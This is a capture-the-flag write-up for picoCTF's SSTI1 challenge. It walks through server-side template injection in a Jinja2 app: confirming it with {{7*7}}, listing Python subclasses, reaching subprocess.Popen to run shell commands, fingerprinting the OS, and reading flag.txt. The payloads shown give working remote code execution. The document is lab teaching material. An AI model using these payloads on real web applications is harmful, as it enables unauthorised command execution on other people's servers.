
# PicoCTF :: SSTI1 

## Step 1
So I tossed this cheeky little payload at the app:

```html
<img src=x>'"${{7*7}}
```

And It gave me `49`. 
That's the signature move of a backend running **Jinja2** or some other Python template engine. 

---

## Step 2
Now that we know it's Jinja2, time to enumerate classes.

I used:
```jinja2
{{ ''.__class__.__mro__[1].__subclasses__() }}
```

And it dropped a big list longer:
```
<class 'mappingproxy'>, <class 'generator'>, ...
```

But I was on the lookout for:  
**`subprocess.Popen`**  
Why? Because it lets you run **actual system commands**. Yeah. From *inside the template*. This ain’t no static rendering — this is full-blown remote code execution.

After scrolling through like a lost intern reading docs, I found its index — `356`. JK
i copied all the content of the page and left that class as the last one, execute a python script to convert the `.txt` file into csv to find the index quickly

---

## Step 3: Code Execution 
almost there

```jinja2
{{ ''.__class__.__mro__[1].__subclasses__()[356]('id', shell=True, stdout=-1).communicate()[0].strip() }}
```

What this does:
- Digs deep into Python's object hierarchy to pull out `subprocess.Popen`
- Runs the command `id`
- Captures the output
- Strips off the extra fluff

If it works, it’ll tell you who you are. Spoiler: you're **root**.

---

## Step 4: Windows or Linux? (Optional)
Before going all in, you wanna know what kind of server you’re poking.

### Plan A – Use `os.name`:
```jinja2
{{''.__class__.__mro__[2].__subclasses__()[X].__init__.__globals__['os'].name}}
```
- `nt` = Windows  
- `posix` = Linux

### Plan B – Ask `platform`:
```jinja2
{{''.__class__.__mro__[2].__subclasses__()[X].__init__.__globals__['platform'].system()}}
```
- `Windows`, `Linux`, or `Darwin` (if you're hacking a MacBook)

Just plug in the right index for a subclass that’s got `os` or `platform` in its globals.

---

## Step 5: 
Now you’ve got code execution, you’ve ID’d the OS, and the server’s all yours.  
Start running commands:
```bash
ls
cat flag.txt
```

Find that flag.

---

# Summary:
- `{{7*7}}` gives `49` → SSTI confirmed   
- Enumerate subclasses → find `subprocess.Popen` 
- Run commands with it like a shell inside the web app   
- Find the flag 
